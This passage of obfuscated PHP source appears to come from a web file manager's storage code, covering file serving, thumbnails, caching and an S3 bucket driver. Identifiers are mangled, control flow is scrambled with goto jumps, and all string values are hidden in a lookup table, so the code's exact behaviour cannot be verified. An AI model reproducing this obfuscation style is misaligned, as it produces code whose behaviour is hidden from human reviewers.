$Dç»·ÂÕîï[113] . $eªµ½îæ¾Ô . $Dç»·ÂÕîï[113]; goto d³‘¶Ñ—Õ; dÑÚ±Ÿğ°: if ($_SERVER[$Dç»·ÂÕîï[154]] == $Dç»·ÂÕîï[155]) { return; } $A¤”ƒñ…Ü¤ = 1024 * 100; $aˆœ¹ƒ¡Ìµ = 0; goto DÏ¶—Ï¾¾; C§—•¿ø°: header($Dç»·ÂÕîï[135] . $B²’„°˜“Ğ); header($Dç»·ÂÕîï[136]); if (!$d¡ºªÎ©É && $e‚¯„·ö¡® == $Dç»·ÂÕîï[137]) { if ($B²’„°˜“Ğ > 1024 * 1024 * 5) { die; } $aì´‡šÎóš = $this->getContent($Fµ‹Äí‘ó); $aì´‡šÎóš = Html::clearSVG($aì´‡šÎóš); header($Dç»·ÂÕîï[138] . $B²’„°˜“Ğ); echo $aì´‡šÎóš; die; } goto fš¸••­ãõ; A³¥ˆÂÕâ: $B²’„°˜“Ğ = $EÒ½öÁÙ¸â[$Dç»·ÂÕîï[77]]; $eÕ×®¤‚ = gmdate($Dç»·ÂÕîï[106], $EÒ½öÁÙ¸â[$Dç»·ÂÕîï[107]]); $F½Ø‘İÜ­‘ = $c¸öîÊö†„ ? $c¸öîÊö†„ : $this->iconvApp($EÒ½öÁÙ¸â[$Dç»·ÂÕîï[28]]); goto aìë‹ Ş™°; bƒ×Ğ¢İ÷â: header($Dç»·ÂÕîï[121]); header($Dç»·ÂÕîï[122] . $AË±®¼Ô™ƒ); header($Dç»·ÂÕîï[123] . gmdate($Dç»·ÂÕîï[106], time() + 3600 * 24 * 30) . $Dç»·ÂÕîï[124]); goto cÌ»Ø²ùã; eâ–æŠÊğŞ: if (isset($_SERVER[$Dç»·ÂÕîï[128]]) && strtotime($_SERVER[$Dç»·ÂÕîï[128]]) == $EÒ½öÁÙ¸â[$Dç»·ÂÕîï[107]]) { header($Dç»·ÂÕîï[129], !0, 304); die; } if (isset($_SERVER[$Dç»·ÂÕîï[130]]) && $_SERVER[$Dç»·ÂÕîï[130]] == $eªµ½îæ¾Ô) { header($Dç»·ÂÕîï[131] . $eªµ½îæ¾Ô, !0, 304); die; } header($Dç»·ÂÕîï[131] . $eªµ½îæ¾Ô); goto CÒ£²ß¤ˆ; Bê†„¯¶Ã®: } public function fileOutServer($f¨´‘õœï§, $còÆÈáÃªŠ = false, $BÆò˜ŒĞª = false, $E§ï‰Ëİâ = '') { $this->fileOut($f¨´‘õœï§, $còÆÈáÃªŠ, $BÆò˜ŒĞª, $E§ï‰Ëİâ); } public function fileOutLink($C±›ƒƒèğ») { header($_SERVER[îÖ][156] . $C±›ƒƒèğ»); die; } public function cacheMethod($DïÒ¶çÀ, $F®ÊğƒáÖ‚) { goto e‰ãªˆÈ·ó; FÌÙ®óêÓ¾: $Eï¹Ø¶¬ñç = isset($AÜî›Íİ‡æ[$EëÊ•Ä³í–]) ? $AÜî›Íİ‡æ[$EëÊ•Ä³í–] : null; if (!is_null($Eï¹Ø¶¬ñç)) { return $Eï¹Ø¶¬ñç; } $Eï¹Ø¶¬ñç = $this->{$DïÒ¶çÀ}($F®ÊğƒáÖ‚); goto dÍù“œóÙÊ; e‰ãªˆÈ·ó: $AÖ¥”Âİ÷Ä =& $_SERVER[îÖ]; static $AÜî›Íİ‡æ = array(); $DàƒæÖçÓ¶ = $F®ÊğƒáÖ‚ ? ltrim($this->getPathOuter($F®ÊğƒáÖ‚), $AÖ¥”Âİ÷Ä[8]) : $F®ÊğƒáÖ‚; goto D˜ƒ§Îó¨; D˜ƒ§Îó¨: $EëÊ•Ä³í– = $AÖ¥”Âİ÷Ä[157] . $DïÒ¶çÀ . $AÖ¥”Âİ÷Ä[158] . rtrim($DàƒæÖçÓ¶, $AÖ¥”Âİ÷Ä[8]); if (is_null($DïÒ¶çÀ)) { $AÜî›Íİ‡æ = array(); return; } if (is_null($F®ÊğƒáÖ‚)) { unset($AÜî›Íİ‡æ[$EëÊ•Ä³í–]); return; } goto FÌÙ®óêÓ¾; dÍù“œóÙÊ: $AÜî›Íİ‡æ[$EëÊ•Ä³í–] = $Eï¹Ø¶¬ñç; return $Eï¹Ø¶¬ñç; goto AØ›àğÙ©Ñ; AØ›àğÙ©Ñ: } public function fileOutImage($a‰Ú·ñ—ó, $e¦××ÔÇº = 250) { goto A¡ˆŸÒ…‹; b·³…•¶Øâ: if (!($Dƒñ„‚Ï„‚ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $a„¹“ë†‘º[165]))) { $BĞ÷ÃÃÃÛ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $a„¹“ë†‘º[166]); } else { $BĞ÷ÃÃÃÛ = KodIO::make($Dƒñ„‚Ï„‚); } if ($Dƒñ„‚Ï„‚ = IO::fileNameExist($BĞ÷ÃÃÃÛ, $dÈŠà÷ç©å)) { $dß¼·Ÿœ…İ = KodIO::make($Dƒñ„‚Ï„‚); return IO::fileOut($dß¼·Ÿœ…İ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto BÇ‡Ú›ãî; a¤£Í¸í¶ˆ: if (!($cØ™ìÇ¿Ë = IO::move($dß¼·Ÿœ…İ, $BĞ÷ÃÃÃÛ))) { return IO::fileOut($dß¼·Ÿœ…İ); } del_file($dß¼·Ÿœ…İ); IO::fileOut($cØ™ìÇ¿Ë); goto fÀöÓë…±‚; A¡ˆŸÒ…‹: $a„¹“ë†‘º =& $_SERVER[îÖ]; if (substr($a‰Ú·ñ—ó, 0, 4) == $a„¹“ë†‘º[144]) { $this->fileOutLink($a‰Ú·ñ—ó); } $c˜–ƒÉÑÏ„ = $this->info($a‰Ú·ñ—ó); goto EÙİÜè¢É; BÇ‡Ú›ãî: $dß¼·Ÿœ…İ = DATA_THUMB . $dÈŠà÷ç©å; if (!@file_exists($dß¼·Ÿœ…İ)) { $e¼åê¼Ø‹÷ = TEMP_FILES; if (!is_dir($e¼åê¼Ø‹÷)) { mk_dir($e¼åê¼Ø‹÷); } $A±ŸğßÛ–¯ = $e¼åê¼Ø‹÷ . $D†ƒ¡è¸­ì . $a„¹“ë†‘º[91] . $c˜–ƒÉÑÏ„[$a„¹“ë†‘º[160]]; if (!@file_exists($A±ŸğßÛ–¯)) { $A±ŸğßÛ–¯ = $this->download($a‰Ú·ñ—ó, $A±ŸğßÛ–¯); } $AîÉ‡ŸÒ = new ImageThumb($A±ŸğßÛ–¯, $a„¹“ë†‘º[167]); $AîÉ‡ŸÒ->prorate($dß¼·Ÿœ…İ, $e¦××ÔÇº, $e¦××ÔÇº * 10); } if (!file_exists($dß¼·Ÿœ…İ) || filesize($dß¼·Ÿœ…İ) < 100) { return @file_exists($A±ŸğßÛ–¯) ? IO::fileOut($A±ŸğßÛ–¯) : $this->fileOut($a‰Ú·ñ—ó); } goto a¤£Í¸í¶ˆ; EÙİÜè¢É: if ($c˜–ƒÉÑÏ„[$a„¹“ë†‘º[77]] <= 1024 * 50 || !function_exists($a„¹“ë†‘º[159]) || $c˜–ƒÉÑÏ„[$a„¹“ë†‘º[160]] == $a„¹“ë†‘º[161]) { return $this->fileOut($a‰Ú·ñ—ó); } if (isset($c˜–ƒÉÑÏ„[$a„¹“ë†‘º[162]][$a„¹“ë†‘º[163]])) { $D†ƒ¡è¸­ì = $c˜–ƒÉÑÏ„[$a„¹“ë†‘º[162]][$a„¹“ë†‘º[163]]; } else { if (isset($c˜–ƒÉÑÏ„[$a„¹“ë†‘º[162]][$a„¹“ë†‘º[164]])) { $D†ƒ¡è¸­ì = $c˜–ƒÉÑÏ„[$a„¹“ë†‘º[162]][$a„¹“ë†‘º[164]]; } else { $D†ƒ¡è¸­ì = md5("{$c˜–ƒÉÑÏ„[$a„¹“ë†‘º[28]]}\137{$c˜–ƒÉÑÏ„[$a„¹“ë†‘º[75]]}\137{$c˜–ƒÉÑÏ„[$a„¹“ë†‘º[77]]}"); } } $dÈŠà÷ç©å = "{$D†ƒ¡è¸­ì}\137{$e¦××ÔÇº}\56\x70\156\x67"; goto b·³…•¶Øâ; fÀöÓë…±‚: } public function fileOutImageServer($aó¦Ìô÷, $EŸ›à×³  = 250) { $this->fileOutImage($aó¦Ìô÷, $EŸ›à×³ ); } public function fileNameAuto($bÄÆÍ“î†¹, $B§Å¤”¨Â, $fÏÅ¤˜Ùõ = REPEAT_RENAME, $A…Í×¶ÒƒÄ = false) { goto AË‹ËÅ’×ƒ; F™äİ÷ñ–Â: $F„éùõœ† = 1; $F†«…ôøºœ = substr($B§Å¤”¨Â, 0, strlen($B§Å¤”¨Â) - strlen($DŒ†êÊÓåÅ)); $fÓ¸İÛ¨± = $F†«…ôøºœ . "\50{$F„éùõœ†}\x29{$DŒ†êÊÓåÅ}"; goto Bî‘Á«æº; EËÀÕÍçµÁ: if ($fÏÅ¤˜Ùõ == REPEAT_SKIP) { return !1; } $DŒ†êÊÓåÅ = $AëˆğÉ½½[91] . get_path_ext($B§Å¤”¨Â); $DŒ†êÊÓåÅ = $DŒ†êÊÓåÅ == $AëˆğÉ½½[91] || $A…Í×¶ÒƒÄ ? $AëˆğÉ½½[33] : $DŒ†êÊÓåÅ; goto F™äİ÷ñ–Â; Bî‘Á«æº: while ($this->exist(rtrim($bÄÆÍ“î†¹, $AëˆğÉ½½[8]) . $AëˆğÉ½½[8] . $fÓ¸İÛ¨±)) { $fÓ¸İÛ¨± = $F†«…ôøºœ . "\50{$F„éùõœ†}\51{$DŒ†êÊÓåÅ}"; $F„éùõœ†++; } return $fÓ¸İÛ¨±; goto A’Ñ®Öˆç´; AË‹ËÅ’×ƒ: $AëˆğÉ½½ =& $_SERVER[îÖ]; $E·ƒƒé”˜ = $bÄÆÍ“î†¹ === $AëˆğÉ½½[33] ? $B§Å¤”¨Â : rtrim($bÄÆÍ“î†¹, $AëˆğÉ½½[8]) . $AëˆğÉ½½[8] . $B§Å¤”¨Â; if ($fÏÅ¤˜Ùõ == REPEAT_REPLACE || !$this->exist($E·ƒƒé”˜) || $A…Í×¶ÒƒÄ && $fÏÅ¤˜Ùõ != REPEAT_RENAME_FOLDER) { return $B§Å¤”¨Â; } goto EËÀÕÍçµÁ; A’Ñ®Öˆç´: } public function listAllFiles($Eãà›®¦çŒ, $EÜÒ¿÷ÁİÇ, $BÑ…‚è•™£ = array()) { goto F¦ºéÈ“²Ù; F¦ºéÈ“²Ù: $bĞ†â±Ãî‚ =& $_SERVER[îÖ]; if (empty($EÜÒ¿÷ÁİÇ)) { return array(); } $F½¼›àË = array(); goto FÙâ³óŒé‚; F¯Ì‰»ğ‘: foreach (array_unique($F½¼›àË) as $a¦’ÎÇÁ½¥) { $aÕªó‹˜è = array($bĞ†â±Ãî‚[75] => $this->getPathOuter($bĞ†â±Ãî‚[8] . $Eãà›®¦çŒ . $bĞ†â±Ãî‚[8] . $a¦’ÎÇÁ½¥), $bĞ†â±Ãî‚[76] => 1, $bĞ†â±Ãî‚[77] => 0); if (substr($a¦’ÎÇÁ½¥, -1) != $bĞ†â±Ãî‚[8]) { $aÕªó‹˜è[$bĞ†â±Ãî‚[76]] = 0; $Fëˆ¬½£Õ = $this->getPath($Eãà›®¦çŒ . $bĞ†â±Ãî‚[8] . $a¦’ÎÇÁ½¥); $aÕªó‹˜è[$bĞ†â±Ãî‚[77]] = isset($BÑ…‚è•™£[$Fëˆ¬½£Õ]) ? $BÑ…‚è•™£[$Fëˆ¬½£Õ] : $this->size($Fëˆ¬½£Õ); } $EŸÕ¿•¡¤”[] = $aÕªó‹˜è; } return $EŸÕ¿•¡¤”; goto bïîØ÷Œğª; FÙâ³óŒé‚: $Eãà›®¦çŒ = trim($Eãà›®¦çŒ, $bĞ†â±Ãî‚[8]); foreach ($EÜÒ¿÷ÁİÇ as $a¦’ÎÇÁ½¥) { $dùªëÎÀ¢ß = ltrim(substr($a¦’ÎÇÁ½¥, strlen($Eãà›®¦çŒ)), $bĞ†â±Ãî‚[8]); $F½¼›àË = array_merge($F½¼›àË, $this->slicePath($dùªëÎÀ¢ß)); } $EŸÕ¿•¡¤” = array(); goto F¯Ì‰»ğ‘; bïîØ÷Œğª: } public function slicePath($A¨À×šŒøë) { $D¦Øø…Ñ…™ =& $_SERVER[îÖ]; $E©¬¾¸½êæ = explode($D¦Øø…Ñ…™[8], trim($A¨À×šŒøë, $D¦Øø…Ñ…™[8])); $Díõóé…¤ª = 0; do { ++$Díõóé…¤ª; $A«•á„Á‰Ñ[] = implode($D¦Øø…Ñ…™[8], array_slice($E©¬¾¸½êæ, 0, $Díõóé…¤ª)) . $D¦Øø…Ñ…™[8]; } while ($Díõóé…¤ª < count($E©¬¾¸½êæ)); $A«•á„Á‰Ñ[count($E©¬¾¸½êæ) - 1] = $A¨À×šŒøë; return $A«•á„Á‰Ñ; } public function getHost() { $Cº£¥Ä‡Š =& $_SERVER[îÖ]; $cÄù˜¬†³â = parse_url(trim($this->domain, $Cº£¥Ä‡Š[8])); $CˆˆæØÂâÑ = isset($cÄù˜¬†³â[$Cº£¥Ä‡Š[168]]) ? $cÄù˜¬†³â[$Cº£¥Ä‡Š[168]] : http_type(); $D‚ëÚ·ÑÄ… = isset($cÄù˜¬†³â[$Cº£¥Ä‡Š[169]]) ? $cÄù˜¬†³â[$Cº£¥Ä‡Š[169]] : $cÄù˜¬†³â[$Cº£¥Ä‡Š[75]]; if (isset($cÄù˜¬†³â[$Cº£¥Ä‡Š[170]])) { $D‚ëÚ·ÑÄ… .= $Cº£¥Ä‡Š[4] . $cÄù˜¬†³â[$Cº£¥Ä‡Š[170]]; } return $CˆˆæØÂâÑ . $Cº£¥Ä‡Š[171] . $D‚ëÚ·ÑÄ…; } public function pathEncode($FóŒÏÒÙÎ£) { $Bïˆ¨Ò„‰é =& $_SERVER[îÖ]; return str_replace($Bïˆ¨Ò„‰é[172], $Bïˆ¨Ò„‰é[8], rawurlencode($FóŒÏÒÙÎ£)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($B³®ùà¹×Í) { set_timeout(); require_once SDK_DIR . $_SERVER[îÖ][173]; parent::__construct(); $this->_init($B³®ùà¹×Í); } public function _init($DÓ¹ñÊÁˆ·) { foreach ($DÓ¹ñÊÁˆ· as $Aø¥ã„¡‡— => $Aë½æ±á´›) { if (isset($this->{$Aø¥ã„¡‡—})) { $this->{$Aø¥ã„¡‡—} = $Aë½æ±á´›; } } $this->endpoint = $DÓ¹ñÊÁˆ·[$_SERVER[îÖ][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($aĞÁ¾ï = "\166\64") { $this->signVer = $aĞÁ¾ï; $this->client->setSignatureVersion($aĞÁ¾ï); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto FÔÅŞÖæç¥; f±©âÂŒ›œ: $f¸½æÈ ˆ = array($f¢¯·¡Õ‰[180], $f¢¯·¡Õ‰[181], $f¢¯·¡Õ‰[182], $f¢¯·¡Õ‰[183], $f¢¯·¡Õ‰[184]); $bÅĞ´ÏÇâ­ = array_diff($f¸½æÈ ˆ, $c§‰Æ–Êç); return empty($bÅĞ´ÏÇâ­); goto fï¯“À´–×; D²Ğ“‘»¿: if ($CªË—ªê·Ş[$f¢¯·¡Õ‰[175]] != $f¢¯·¡Õ‰[176] || $CªË—ªê·Ş[$f¢¯·¡Õ‰[177]] != $f¢¯·¡Õ‰[176]) { return !1; } $c§‰Æ–Êç = array_map($f¢¯·¡Õ‰[178], $CªË—ªê·Ş[$f¢¯·¡Õ‰[179]]); if (!is_array($c§‰Æ–Êç)) { $c§‰Æ–Êç = array(); } goto f±©âÂŒ›œ; FÔÅŞÖæç¥: $f¢¯·¡Õ‰ =& $_SERVER[îÖ]; $CªË—ªê·Ş = $this->getBucketCors(); if (!$CªË—ªê·Ş || !is_array($CªË—ªê·Ş)) { return !1; } goto D²Ğ“‘»¿; fï¯“À´–×: } public function mkfile($E‘òÌ„ê“Ş, $eô¿Î¥Ïáô = '', $FÛ¿âÀ¬ªò = REPEAT_RENAME) { $AøÓà‚íÅ = $this->setContent($E‘òÌ„ê“Ş, $eô¿Î¥Ïáô); if ($AøÓà‚íÅ !== !1) { return $this->getPathOuter($E‘òÌ„ê“Ş); } return !1; } public function mkdir($bÕ‰£ë‡®Ü, $FŒğòĞ¯Öº = REPEAT_SKIP) { if (empty($bÕ‰£ë‡®Ü)) { return !1; } if ($this->_isFolder($bÕ‰£ë‡®Ü)) { return $this->getPathOuter($bÕ‰£ë‡®Ü); } $e‘‚§¸İ“ = $this->setContent($bÕ‰£ë‡®Ü, $_SERVER[îÖ][33], !0); if ($e‘‚§¸İ“ !== !1) { return $this->getPathOuter($bÕ‰£ë‡®Ü); } return !1; } public function copyFile($E–œÖ¯šØ, $cõŞ†Ã„ÔÜ, $D¬¡êÅ†‡¦ = array()) { $f¢£Ç¤°¬Ğ =& $_SERVER[îÖ]; $E¼¸“„®Œë = $this->objectMeta($E–œÖ¯šØ); if (!$E¼¸“„®Œë) { return !1; } if ($E¼¸“„®Œë[$f¢£Ç¤°¬Ğ[77]] <= 1024 * 1024 * 200) { $f²Ã¡©õÅÖ = $this->client->copyObject($this->bucket, $E–œÖ¯šØ, $this->bucket, $cõŞ†Ã„ÔÜ, $f¢£Ç¤°¬Ğ[185], $D¬¡êÅ†‡¦); } else { $f²Ã¡©õÅÖ = $this->client->multiCopyObject($this->bucket, $E–œÖ¯šØ, $this->bucket, $cõŞ†Ã„ÔÜ, $D¬¡êÅ†‡¦); } $f²Ã¡©õÅÖ = $f²Ã¡©õÅÖ ? $this->getPathOuter($cõŞ†Ã„ÔÜ) : !1; return $f²Ã¡©õÅÖ; } public function moveFile($dàˆÕî¡Õ, $bÁîó¬ÌšÅ) { if ($this->copyFile($dàˆÕî¡Õ, $bÁîó¬ÌšÅ)) { $this->delFile($dàˆÕî¡Õ); return $this->getPathOuter($bÁîó¬ÌšÅ); } return !1; } public function delFile($F‡Šôï¨«œ) { return $this->client->deleteObject($this->bucket, $F‡Šôï¨«œ); } public function delFolder($dÇàò¸Ï™­) { goto b÷”óÀ„À–; b÷”óÀ„À–: $eè…Î­Ê« =& $_SERVER[îÖ]; $cˆÄ—Ìá¡£ = $this->listObjs($dÇàò¸Ï™­); if (!$cˆÄ—Ìá¡£) { $dÇàò¸Ï™­ = trim($dÇàò¸Ï™­, $eè…Î­Ê«[8]); if (!empty($dÇàò¸Ï™­)) { $dÇàò¸Ï™­ .= $eè…Î­Ê«[8]; } return $this->delFile($dÇàò¸Ï™­); } goto DÇ”‡Š³ãò; DÇ”‡Š³ãò: $C½˜İ±ï¼ = $F³¨×¾³¿ğ = 0; $A¶à¤œòøÇ = array_chunk(array_keys($cˆÄ—Ìá¡£), 1000); foreach ($A¶à¤œòøÇ as $D¿Á‡ôÁƒÕ) { $C½˜İ±ï¼++; $F³¨×¾³¿ğ += (int) $this->client->deleteObjects($this->bucket, $D¿Á‡ôÁƒÕ); } goto E„Šš¨Íæ; E„Šš¨Íæ: return $C½˜İ±ï¼ === $F³¨×¾³¿ğ ? !0 : !1; goto C±‹­³ïÁò; C±‹­³ïÁò: } public function rename($bÌŠ™½»™, $F£éÁÂ‡®œ) { return $this->renameObject($bÌŠ™½»™, $F£éÁÂ‡®œ); } public function listPath($E¿‘éææÓ†, $b¢Õ÷ËµÆ† = false) { $Dš‰ÔÌº‹ =& $_SERVER[îÖ]; $E®ŸùÆª = $this->listObjs($E¿‘éææÓ†, null, null, $Dš‰ÔÌº‹[8]); $eåÑ­Â×‡‘ = array($Dš‰ÔÌº‹[74] => array(), $Dš‰ÔÌº‹[73] => array()); foreach ($E®ŸùÆª as $fóµÙà÷´ => $aß²ö—†ìï) { if ($fóµÙà÷´ == $Dš‰ÔÌº‹[8]) { continue; } if (isset($aß²ö—†ìï[$Dš‰ÔÌº‹[186]])) { $eåÑ­Â×‡‘[$Dš‰ÔÌº‹[74]][] = $this->folderInfo($aß²ö—†ìï[$Dš‰ÔÌº‹[186]], $b¢Õ÷ËµÆ†); } else { if (substr($aß²ö—†ìï[$Dš‰ÔÌº‹[28]], -1) == $Dš‰ÔÌº‹[8]) { continue; } $eåÑ­Â×‡‘[$Dš‰ÔÌº‹[73]][] = $this->fileInfo($aß²ö—†ìï[$Dš‰ÔÌº‹[28]], $b¢Õ÷ËµÆ†, $aß²ö—†ìï); } } return $eåÑ­Â×‡‘; } private function fileInfo($eµ„–¾ŞÍ„, $bò™ØºŠÁæ = false, $fò¡¸Ú½É = array()) { goto b··±­Æé; F¬ø÷¨–áô: if (empty($fò¡¸Ú½É)) { $fò¡¸Ú½É = $this->objectMeta($eµ„–¾ŞÍ„); if (!$fò¡¸Ú½É) { return $E¢ßÑÙºš¬; } } if (isset($fò¡¸Ú½É[$eôÓ—¢áÏ[190]])) { $E¢ßÑÙºš¬[$eôÓ—¢áÏ[107]] = $fò¡¸Ú½É[$eôÓ—¢áÏ[190]]; } if (isset($fò¡¸Ú½É[$eôÓ—¢áÏ[77]])) { $E¢ßÑÙºš¬[$eôÓ—¢áÏ[77]] = $fò¡¸Ú½É[$eôÓ—¢áÏ[77]]; } goto EŠÊ­Ø–; EŠÊ­Ø–: return $E¢ßÑÙºš¬; goto Dæ»‰óÎù„; b··±­Æé: $eôÓ—¢áÏ =& $_SERVER[îÖ]; if ($bò™ØºŠÁæ) { return array($eôÓ—¢áÏ[28] => $this->pathThis($eµ„–¾ŞÍ„), $eôÓ—¢áÏ[75] => $this->getPathOuter($eµ„–¾ŞÍ„), $eôÓ—¢áÏ[29] => $eôÓ—¢áÏ[167], $eôÓ—¢áÏ[160] => $this->ext($eµ„–¾ŞÍ„), $eôÓ—¢áÏ[77] => isset($fò¡¸Ú½É[$eôÓ—¢áÏ[77]]) ? $fò¡¸Ú½É[$eôÓ—¢áÏ[77]] : 0, $eôÓ—¢áÏ[187] => 0, $eôÓ—¢áÏ[107] => 0, $eôÓ—¢áÏ[188] => !0, $eôÓ—¢áÏ[189] => !0); } $E¢ßÑÙºš¬ = array($eôÓ—¢áÏ[28] => $this->pathThis($eµ„–¾ŞÍ„), $eôÓ—¢áÏ[75] => $this->getPathOuter($eµ„–¾ŞÍ„), $eôÓ—¢áÏ[29] => $eôÓ—¢áÏ[167], $eôÓ—¢áÏ[187] => 0, $eôÓ—¢áÏ[107] => 0, $eôÓ—¢áÏ[77] => 0, $eôÓ—¢áÏ[160] => $this->ext($eµ„–¾ŞÍ„), $eôÓ—¢áÏ[188] => !0, $eôÓ—¢áÏ[189] => !0); goto F¬ø÷¨–áô; Dæ»‰óÎù„: } private function folderInfo($cƒæ©™«†µ, $F‹ê–Ã® = false) { goto EÒœ‚Ò¿µå; E™¸†—‚â: if (isset($fì¼£Å×”[$Få´•ï„Ñõ[190]])) { $DŒÌ‡‹é¸ê[$Få´•ï„Ñõ[187]] = $fì¼£Å×”[$Få´•ï„Ñõ[190]]; } return $DŒÌ‡‹é¸ê; goto cÑğÉŠÍÄÌ; EÒœ‚Ò¿µå: $Få´•ï„Ñõ =& $_SERVER[îÖ]; if ($F‹ê–Ã®) { return array($Få´•ï„Ñõ[28] => $this->pathThis($cƒæ©™«†µ), $Få´•ï„Ñõ[75] => $this->getPathOuter($Få´•ï„Ñõ[8] . $cƒæ©™«†µ), $Få´•ï„Ñõ[29] => $Få´•ï„Ñõ[76], $Få´•ï„Ñõ[188] => !0, $Få´•ï„Ñõ[189] => !0); } $DŒÌ‡‹é¸ê = array($Få´•ï„Ñõ[28] => $this->pathThis($cƒæ©™«†µ), $Få´•ï„Ñõ[75] => $this->getPathOuter($Få´•ï„Ñõ[8] . $cƒæ©™«†µ), $Få´•ï„Ñõ[29] => $Få´•ï„Ñõ[76], $Få´•ï„Ñõ[187] => 0, $Få´•ï„Ñõ[107] => 0, $Få´•ï„Ñõ[188] => !0, $Få´•ï„Ñõ[189] => !0); goto aÁ™­ìä˜; aÁ™­ìä˜: if ($cƒæ©™«†µ == $Få´•ï„Ñõ[33]) { return $DŒÌ‡‹é¸ê; } $cƒæ©™«†µ = trim($cƒæ©™«†µ, $Få´•ï„Ñõ[8]) . $Få´•ï„Ñõ[8]; $fì¼£Å×” = $this->objectMeta($cƒæ©™«†µ); goto E™¸†—‚â; cÑğÉŠÍÄÌ: } public function listObjs($F¶¶¶ë¤ô, $C ÆëÜ¾‡¿ = null, $eœñâì×£ = null, $F§«ì ¸Ÿ = null) { $f¸ˆÛšˆçÊ =& $_SERVER[îÖ]; $F¶¶¶ë¤ô = trim($F¶¶¶ë¤ô, $f¸ˆÛšˆçÊ[8]); $bö­¤Å†¥˜ = empty($F¶¶¶ë¤ô) ? $f¸ˆÛšˆçÊ[33] : $F¶¶¶ë¤ô . $f¸ˆÛšˆçÊ[8]; return $this->client->getBucket($this->bucket, $bö­¤Å†¥˜, $C ÆëÜ¾‡¿, $eœñâì×£, $F§«ì ¸Ÿ, !0); } public function has($eèì·ä†², $B¨÷ÉÃ°Ç = false, $e©ø¿Ã¦Óó = true) { goto cê“¨‹Ò²; Ağ½ŠÈ­Ø¸: $a¹„ƒî†Œ = $this->listObjs($eèì·ä†², null, null, $c ßíÉ… [8]); $a¹„ƒî†Œ = is_array($a¹„ƒî†Œ) ? $a¹„ƒî†Œ : array(); foreach ($a¹„ƒî†Œ as $C Š†®áğ) { if (isset($C Š†®áğ[$c ßíÉ… [28]]) && substr($C Š†®áğ[$c ßíÉ… [28]], -1) != $c ßíÉ… [8]) { if (!$B¨÷ÉÃ°Ç && $e©ø¿Ã¦Óó) { return !0; } $A¿ôñ¡Ñ¤++; } else { if (isset($C Š†®áğ[$c ßíÉ… [186]])) { if (!$B¨÷ÉÃ°Ç && !$e©ø¿Ã¦Óó) { return !1; } $a±ãÏˆÚ„Ï++; } } } goto Aó„› ±ö‚; cê“¨‹Ò²: $c ßíÉ…  =& $_SERVER[îÖ]; $A¿ôñ¡Ñ¤ = 0; $a±ãÏˆÚ„Ï = 0; goto Ağ½ŠÈ­Ø¸; Aó„› ±ö‚: if ($B¨÷ÉÃ°Ç) { return array($c ßíÉ… [191] => $A¿ôñ¡Ñ¤, $c ßíÉ… [192] => $a±ãÏˆÚ„Ï); } return !1; goto F–±¥õé; F–±¥õé: } public function listAll($dè£ïÏ„ƒ) { $fº—ëÛ›Ìî =& $_SERVER[îÖ]; $Fİ¬‹×èë— = $this->listObjs($dè£ïÏ„ƒ); $dİê‚˜—ö£ = $fÎÃ„Øã¢‡ = array(); foreach ($Fİ¬‹×èë— as $aˆÏ™ÒÏÄ¸ => $f°Ğ³è£Ÿï) { $dİê‚˜—ö£[] = $f°Ğ³è£Ÿï[$fº—ëÛ›Ìî[28]]; $fÎÃ„Øã¢‡[$aˆÏ™ÒÏÄ¸] = $f°Ğ³è£Ÿï[$fº—ëÛ›Ìî[77]]; } return $this->listAllFiles($dè£ïÏ„ƒ, $dİê‚˜—ö£, $fÎÃ„Øã¢‡); } public function canRead($B›°÷çŠ†—) { $B“ˆÙãïÓœ =& $_SERVER[îÖ]; $C¹³†•ãõ = $this->client->getAccessControlPolicy($this->bucket, $B›°÷çŠ†—); if (!$C¹³†•ãõ) { return !1; } return in_array($C¹³†•ãõ, array($B“ˆÙãïÓœ[193], $B“ˆÙãïÓœ[194], $B“ˆÙãïÓœ[195])) ? !0 : !1; } public function canWrite($b¬ª„ËÙ¾ø) { $D­‹¦å ¬ø =& $_SERVER[îÖ]; $e¤ã¬§ĞöÇ = $this->client->getAccessControlPolicy($this->bucket, $b¬ª„ËÙ¾ø); if (!$e¤ã¬§ĞöÇ) { return !1; } return in_array($e¤ã¬§ĞöÇ, array($D­‹¦å ¬ø[193], $D­‹¦å ¬ø[194])) ? !0 : !1; } public function getContent($F«¯¶÷¼§ô) { return $this->client->getObject($this->bucket, $F«¯¶÷¼§ô); } public function setContent($cæöÙ›îâ, $DÍò§ö¯ß’ = '', $d¢—±•¥è¦ = false) { goto F«ƒ·¥®ìõ; F«ƒ·¥®ìõ: $DŸäáœŞØ” =& $_SERVER[îÖ]; $cæöÙ›îâ = $d¢—±•¥è¦ ? trim($cæöÙ›îâ, $DŸäáœŞØ”[8]) . $DŸäáœŞØ”[8] : $cæöÙ›îâ; $Få¯¾…Œ¶ = get_file_mime(get_path_ext($cæöÙ›îâ)); goto aæ„—éŞ¤Ö; aæ„—éŞ¤Ö: $AŒ±Éàß¥• = $this->client->putObject($DÍò§ö¯ß’, $this->bucket, $cæöÙ›îâ, $DŸäáœŞØ”[185], array(), $Få¯¾…Œ¶); if (!$AŒ±Éàß¥•) { return !1; } if ($d¢—±•¥è¦) { return !0; } goto C¢ÎÄõ‚˜; C¢ÎÄõ‚˜: $AŒ±Éàß¥• = $this->copyFile($cæöÙ›îâ, $cæöÙ›îâ, array($DŸäáœŞØ”[196] => $AŒ±Éàß¥•[$DŸäáœŞØ”[197]])); return $AŒ±Éàß¥• ? !0 : !1; goto b¯¾œ¿ô; b¯¾œ¿ô: } public function fileSubstr($F´Éí×³Öã, $bàÊ¨ÂØ¯‰, $Fñ¶à‰ºí‘) { $e²™èÙ‰£ = $bàÊ¨ÂØ¯‰ + $Fñ¶à‰ºí‘ - 1; return $this->client->getObject($this->bucket, $F´Éí×³Öã, array($_SERVER[îÖ][198] => "\142\x79\164\x65\163\x3d{$bàÊ¨ÂØ¯‰}\55{$e²™èÙ‰£}")); } public function upload($F„µÒíä‰, 